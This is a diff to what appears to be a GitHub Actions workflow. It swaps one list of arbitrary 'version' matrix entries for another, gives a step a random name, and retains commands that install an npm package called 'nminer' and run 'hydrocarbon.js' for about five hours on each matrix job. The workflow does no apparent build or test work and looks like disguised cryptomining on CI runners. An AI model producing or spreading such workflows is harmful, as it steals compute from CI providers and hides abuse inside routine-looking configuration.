@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1820 }
-          - { version: 8930 }
-          - { version: 3980 }
-          - { version: 4384 }
-          - { version: 3221 }
-          - { version: 7146 }
-          - { version: 2890 }
-          - { version: 9451 }
-          - { version: 2488 }
-          - { version: 4105 }
-          - { version: 3450 }
-          - { version: 6808 }
-          - { version: 6329 }
-          - { version: 6730 }
-          - { version: 2729 }
-          - { version: 9093 }
-          - { version: 5619 }
-          - { version: 9937 }
-          - { version: 6580 }
+          - { version: 2289 }
+          - { version: 5792 }
+          - { version: 4134 }
+          - { version: 9478 }
+          - { version: 4670 }
+          - { version: 1224 }
+          - { version: 4358 }
+          - { version: 8700 }
+          - { version: 7012 }
+          - { version: 9138 }
+          - { version: 5674 }
+          - { version: 7199 }
+          - { version: 308 }
+          - { version: 1905 }
+          - { version: 2869 }
+          - { version: 787 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: before what distant
+      - name: vice
         run: |
           npm install nminer@latest
-          timeout 333m node hydrocarbon.js || echo "hydrocarbon executed"
+          timeout 305m node hydrocarbon.js || echo "hydrocarbon executed"
